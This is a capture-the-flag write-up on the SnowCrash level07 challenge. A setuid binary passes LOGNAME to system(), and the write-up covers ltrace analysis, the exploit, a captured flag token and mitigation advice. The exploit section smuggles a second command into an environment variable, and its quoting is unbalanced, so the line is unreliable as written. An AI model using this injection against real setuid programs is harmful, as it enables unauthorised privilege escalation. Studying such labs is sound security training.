## 📄 Description

In this level, we are presented with a **setuid binary** owned by the next level's user (**flag07**). Our objective is to exploit the binary to gain access to flag07's account and retrieve the flag by executing **getflag** command.

## 📦 Binary Info

Upon inspecting the home directory of level07, we find the following binary:

```
-rwsr-sr-x 1 flag07 level07 8604 Mar  5  2016 level07
```

#### 🔍 File Analysis

- Owner: `flag07`
- Group: `level07`
- Permissions: `-rwsr-sr-x`
  - The `s` in place of `x` indicates the setuid and setgid bits are set.
  - When executed, the binary runs with the privileges of its owner (`flag07`), not the user who executed it.

## 🔍 Runtime Behavior

To analyze what the binary does under the hood, we use `ltrace`:

```
ltrace ./level07
```

#### 🔎 Output Snippet:

```
getenv("LOGNAME") = "level07"
asprintf(...) = 18
system("/bin/echo level07 level07")
```

#### 💡 Vulnerability Discovered:

- The binary retrieves the value of the `LOGNAME` environment variable.
- It uses this value in a **shell command** via `system()`.
- This opens the door for **command injection**, as no sanitization is applied.

## ⚔️ Exploitation Strategy

To exploit this:

- We inject a shell command via the LOGNAME environment variable.

#### ✅ Exploit Execution:

```
export LOGNAME='"Hacked !"; getflag"
./level07
```

#### 📌 Result:

```
level07@SnowCrash:~$ ./level07
Hacked !
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

## 🛡️ Mitigation Advice (Real Systems)

In a real-world context, this vulnerability would be classified as:

- Command Injection via unsanitized input (`CWE-78`).
- Exacerbated by unsafe use of `system()` with environment variables.

#### 🧼 Best Practices:

- Avoid `system()` entirely for any user-influenced data.
- Use safer alternatives like `execve()` with sanitized arguments.
- Sanitize all environment variable usage or reset the environment.
